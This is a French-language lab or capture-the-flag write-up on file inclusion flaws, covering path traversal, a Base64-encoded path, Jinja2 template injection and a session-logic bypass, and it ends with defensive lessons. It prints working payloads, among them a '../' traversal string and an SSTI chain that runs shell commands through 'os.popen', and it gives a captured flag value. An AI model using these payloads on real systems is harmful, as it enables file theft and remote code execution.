# 🛡️ Sécurité Web – Vulnérabilités de File Inclusion (0x07)

## 📌 Présentation

Ce projet a pour objectif d’exploiter différentes vulnérabilités liées à l’inclusion de fichiers dans des applications web.
À travers plusieurs tâches, nous identifions des failles, contournons des protections et récupérons des informations sensibles (flags).

---

# 🚀 Task 0 – File Inclusion basique

## 🎯 Objectif

Récupérer le flag situé dans :

```bash
/etc/0-flag.txt
```

## 🔍 Analyse

L’endpoint :

```bash
/task0/list_file
```

accepte des paramètres contrôlés par l’utilisateur :

* `filename`
* `path`

## 💥 Exploitation

Aucune validation n’est effectuée sur le chemin :

```bash
/task0/download_file?filename=0-flag.txt&path=/etc
```

## 🧠 Vulnérabilité

* Mauvaise gestion des chemins
* Absence de contrôle d’accès

## 🏁 Résultat

Flag récupéré avec succès

---

# 🚀 Task 1 – Contournement de filtre (Path Traversal)

## 🎯 Objectif

Récupérer :

```bash
/tmp/secure_storage/1-flag.txt
```

## 🔍 Analyse

L’accès direct à `/tmp` est bloqué.

## 💥 Exploitation

Contournement avec traversal :

```bash
/task1/download_file?filename=1-flag.txt&path=../../../../tmp/secure_storage
```

## 🧠 Vulnérabilité

* Filtrage insuffisant
* Traversée de répertoires (`../`) autorisée

## 🏁 Résultat

Flag récupéré

---

# 🚀 Task 2 – Chemin encodé (Base64)

## 🎯 Objectif

Récupérer :

```bash
2-flag.txt
```

## 🔍 Analyse

Le paramètre `path` est encodé en Base64.

Exemple :

```bash
YWJjMTIzX3NlY3JldF9wYXRoX3RvX2ZsYWc=
```

## 🔓 Décodage

```bash
abc123_secret_path_to_flag
```

## 💥 Exploitation

Utilisation directe du path encodé :

```bash
/task2/download_file?filename=2-flag.txt&path=YWJjMTIzX3NlY3JldF9wYXRoX3RvX2ZsYWc=
```

## 🧠 Vulnérabilité

* Sécurité basée sur l’obfuscation
* Aucun contrôle réel

## 🏁 Résultat

Flag récupéré

---

# 🚀 Task 3 – SSTI (Injection de Template)

## 🎯 Objectif

Récupérer le flag caché dans un rapport

## 🔍 Analyse

Les rapports sont générés avec **Jinja2**
Les entrées utilisateur sont injectées dans le template.

## 🧪 Détection

```jinja
{{7*7}} → 49
```

## 💥 Exploitation

Exécution de code Python via SSTI :

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat RAPPORT_15-49.html').read() }}
```

## 🧠 Insight clé

* Le flag est caché dans un rapport spécifique : **15-49**
* Encodage Base64 utilisé comme diversion

## 🏁 Résultat

Flag récupéré :

```bash
8ac80e40db5bdb50f82ad4a7fea28e7b
```

---

# 🚀 Task 4 – LFI avancé + faille logique

## 🎯 Objectif

Récupérer le flag final

## 🔍 Analyse

Endpoint principal :

```bash
/find_your_shell/
```

* LFI bloqué (retourne toujours README)
* Présence d’une logique basée sur session

## 💥 Étape 1 – Activation du shell

```bash
/task4_file_hub/shell.php
```

Réponse :

```bash
FLAG_SET is now true.
```

## 💥 Étape 2 – Accès au script caché

Accès direct (sans `?file=`) :

```bash
/task4_file_hub/flag.php
```

## 🧠 Vulnérabilité

* Faille logique basée sur une variable de session
* Chemin d’exécution caché
* LFI utilisé comme distraction

## 🏁 Résultat

Flag récupéré avec succès

---

# 🧠 Leçons importantes

* Ne jamais faire confiance aux entrées utilisateur
* L’encodage ne protège pas une application
* Les moteurs de template peuvent mener à une RCE
* Les failles logiques sont souvent critiques
* Toujours analyser le comportement global de l’application

---

# 🔥 Compétences acquises

* Local File Inclusion (LFI)
* Path Traversal
* Contournement de filtres
* Exploitation SSTI
* Énumération système
* Analyse logique d’application

---

# 🏁 Conclusion

Ce projet montre comment enchaîner plusieurs vulnérabilités pour compromettre un système.
La compréhension de la logique applicative est aussi importante que la technique.

---
